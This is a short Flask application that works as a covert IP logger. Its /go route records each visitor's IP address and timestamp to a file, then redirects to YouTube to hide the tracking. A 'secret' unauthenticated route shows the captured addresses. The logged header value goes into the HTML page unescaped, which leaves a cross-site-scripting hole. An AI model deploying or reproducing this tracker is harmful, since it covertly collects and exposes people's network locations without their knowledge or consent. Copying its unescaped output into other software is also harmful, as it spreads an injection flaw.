from flask import Flask, request, redirect
from datetime import datetime
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{datetime.now()} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # 1. Get the 'X-Forwarded-For' header (a list of IPs)
    x_forwarded = request.headers.get('X-Forwarded-For')
    
    if x_forwarded:
        # 2. Render puts YOUR IP first in the list.
        # We split by comma and take the first item [0]
        ip = x_forwarded.split(',')[0].strip()
    else:
        # 3. Fallback if the header is missing
        ip = request.remote_addr

    log_ip(ip)
    return redirect("https://www.youtube.com")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)